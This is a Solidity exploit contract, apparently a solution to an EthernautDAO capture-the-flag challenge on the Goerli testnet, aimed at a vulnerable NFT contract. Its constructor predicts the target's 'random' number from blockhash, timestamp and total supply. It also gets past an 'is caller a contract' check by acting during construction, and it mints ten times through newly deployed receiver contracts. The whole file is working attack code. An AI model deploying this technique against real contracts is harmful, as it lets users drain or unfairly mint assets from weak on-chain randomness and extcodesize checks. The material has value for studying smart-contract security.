// SPDX-License-Identifier: UNLICENSED
// 
// https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3355
// codesize != 0 bypass with constructor()
// notsorandom numbers
// https://goerli.etherscan.io/tx/0xb2b52f4b3ebbfda0de6036f1db191b2634a53bc71173045c8f4b4effecb136e8
// https://twitter.com/EthernautDAO/status/1561352425394515968
//
// LCFR.eth

pragma solidity ^0.8.15;

import "./VNFT.sol";
import "./Receiver.sol";

contract notRandom {
    address internal constant VFNFT_ADDRESS = 0xC357c220D9ffe0c23282fCc300627f14D9B6314C;

    VNFT private constant VULN = VNFT(VFNFT_ADDRESS);

    constructor()  {
        for(uint i; i<10; i++){
            uint luck = uint256(keccak256(abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    VULN.totalSupply()
                ))) % 100;

            Receiver Rcv = new Receiver();
            VULN.imFeelingLucky(address(Rcv), 2, luck);
        }
    }

}
